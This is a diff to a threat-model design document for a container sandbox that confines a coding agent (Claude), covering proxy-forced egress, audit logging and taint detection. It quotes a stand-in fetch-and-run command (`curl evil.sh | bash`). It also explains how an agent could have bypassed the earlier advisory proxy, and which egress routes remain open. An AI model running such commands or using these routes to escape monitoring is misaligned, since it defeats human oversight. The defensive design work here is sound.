@@ -16,10 +16,10 @@ What aidc protects against, with mitigations:
 |--------|------------|-----|
 | Claude modifies host files outside the mounted repo | Container filesystem isolation: only the repo is bind-mounted read-write; the rest of the container has no host visibility | `design-01-architecture.md` |
 | Claude pushes a malicious commit to GitHub | No SSH keys, no GitHub tokens, no `gh`; optional system pre-push hook as belt-and-suspenders | `design-02-git-isolation.md` |
-| Claude runs `curl evil.sh \| bash` | Proxy stack blocks known-bad domains (URLhaus, ThreatFox, HaGeZi-TIF) + Quad9 DNS upstream + state-actor TLD policy | `design-04-proxy-stack.md` |
+| Claude runs `curl evil.sh \| bash` | Session bridge is a Docker `internal` network — no NAT, so the only route out is dual-homed squid, which blocks known-bad domains (URLhaus, ThreatFox, HaGeZi-TIF) + Quad9 DNS upstream + state-actor TLD policy | `design-04-proxy-stack.md`, NET-14 |
 | Claude destroys / spies on host Docker | DinD instead of host socket mount; inner daemon is fully scoped to the outer container | `design-03-docker-isolation.md` |
 | Claude persists malware in a container image | Container is ephemeral — `aidc kill` destroys everything; next `aidc create` starts clean | `design-01-architecture.md`, this doc |
-| Claude exfiltrates secrets present in the working tree | Outbound HTTPS subject to proxy; high-signal known-bad domains blocked; Quad9 NXDOMAINs threat-intel hits | `design-04-proxy-stack.md` |
+| Claude exfiltrates secrets present in the working tree | Outbound HTTPS **forced** through the proxy (no route around it); high-signal known-bad domains blocked; Quad9 NXDOMAINs threat-intel hits | `design-04-proxy-stack.md` |
 | Claude tampers with the API that controls it (Phase 2) | HTTP control API runs in a separate sidecar with isolated network namespace — Claude cannot reach it | `design-06-remote-control.md` |
 | Claude leaves no audit trail | Audit aggregator captures Squid access log, shell history, Claude session transcript to a host-visible directory | `design-04-proxy-stack.md` |
 | A successful malware-list hit goes unnoticed | Policy sidecar marks the container *tainted* in real time, with configurable response | This doc |
@@ -29,6 +29,40 @@ What aidc protects against, with mitigations:
 ## What aidc does NOT protect against
 
 Being honest about residual risk:
+
+### Egress enforcement, and what it rests on (NET-14)
+
+Until v1.3.0 the proxy was **advisory**. `HTTP_PROXY` pointed at squid, but the
+session bridge was an ordinary NATed Docker network, so anything that ignored
+the variable — four `env -u` flags, a library that doesn't read it, a raw socket
+— reached the internet directly, unfiltered and *unlogged*. Because the policy
+sidecar tails squid's `access.log`, traffic that skipped squid could not taint
+the session. NET-10 claimed this was impossible; it wasn't.
+
+The fix is topological rather than a filter. The session bridge is declared
+`internal: true`, so Docker installs no masquerade rule for it and there is no
+route off that bridge at all. Squid is dual-homed onto a separate `egress`
+network and is the only way out. This matters because the dev container is
+`--privileged` (DinD): any rule *inside* it can be flushed by the agent, so
+enforcement has to live where the agent cannot reach. Measured against a
+privileged container that added an explicit default route via squid, enabled
+`ip_forward`, and installed its own `MASQUERADE`: every attempt returned
+`Network is unreachable`.
+
+Only `squid`, `refresher` (fetches threat feeds) and `policy` (POSTs the taint
+webhook) join the egress network. `dev` and `audit` never do.
+
+**Two ways out remain, both deliberate and both visible:**
+
+- `egress: direct` / `--egress direct` restores the old NATed bridge for
+  sessions needing reachability an attached network can't provide (ZeroTier,
+  Tailscale, direct DNS). `aidc create` says plainly that enforcement is off.
+- An attached network (NET-13) grants whatever that network grants. Most compose
+  bridges are NATed, so attaching one restores general internet egress as a side
+  effect. This is not something aidc can prevent — it doesn't own that network —
+  and an internal bridge has no default route of its own, so the attached
+  bridge's gateway becomes the default by forfeit. Attach the narrowest network
+  that does the job.
 
 ### Working-tree secrets
 
